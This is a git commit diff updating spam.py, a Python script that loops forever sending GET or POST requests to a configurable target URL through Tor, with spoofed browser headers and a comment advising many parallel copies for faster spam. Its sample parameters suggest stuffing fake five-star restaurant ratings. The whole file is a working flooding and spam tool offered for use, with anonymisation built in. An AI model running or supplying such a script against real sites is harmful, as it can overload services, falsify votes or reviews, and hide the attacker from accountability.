33e821f1f7ed53f2fc76bb1f25ac89a0603c8c3f
Ism8el <82142134+ism8el@users.noreply.github.com>
2023-02-02 16:37:34 +0100

    Update spam.py

--- spam.py
+++ spam.py
@@ -3,16 +3,31 @@
 import requests
 import random
 
-# pip install requests[socks]
-# ./script.py & ./script.py & ./script.py & ./script.py & ./script.py, etc... pour plus de perforance
+# pip install requests requests[socks] random
+# ./script.py & ./script.py & [...] ./script.py (For a faster spam)
 
-url = "http://target.com/page/"
+########## Change this ##########
+# Basic configuration
+url = "http://target.com/page/" # Url to spam
+method = "GET" # Method GET or POST
+data = {'Restaurant': 'the chef\'s table', 'star': '5'} # Parameters to send
 
-torport = 9050
-proxies = {
-    'http': "socks5h://localhost:{}".format(torport),
-    'https': "socks5h://localhost:{}".format(torport)
-}
+# Tor configuration
+use_tor = "YES" # YES/NO
+tor_ip_proxy = "localhost" # Tor proxy IP
+torport = 9050 # Proxy Tor port (9050 by default)
+
+
+########## Program ##########
+if use_tor == "YES":
+    proxies = {
+        'http': "socks5h://"+tor_ip_proxy+":{}".format(torport),
+        'https': "socks5h://"+tor_ip_proxy+":{}".format(torport)
+        }
+elif use_tor == "NO":
+    proxies = {}
+else:
+    print("[-] Error (Invalid Tor settings)")
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
@@ -25,12 +40,21 @@ headers = {
     'From': url,
     'Referer': url
 }
+
 i = 0
 
 while True:
-        try:
-                response = requests.get(url, headers=headers, verify=False, proxies=proxies)
-                print("[+] OK", i)
-        except:
-                print("[-] Erreur")
+    try:
+        if method == "GET":
+            response = requests.get(url, headers=headers, verify=False, proxies=proxies, params=data)
+        elif method == "POST":
+            response = requests.post(url, headers=headers, verify=False, proxies=proxies, data=data)
+        else:
+            print("[-] Error (Bad method)")
+            exit()
+        
+        print("[+] OK", i)
         i += 1
+    except:
+        print("[-] Error")
+      
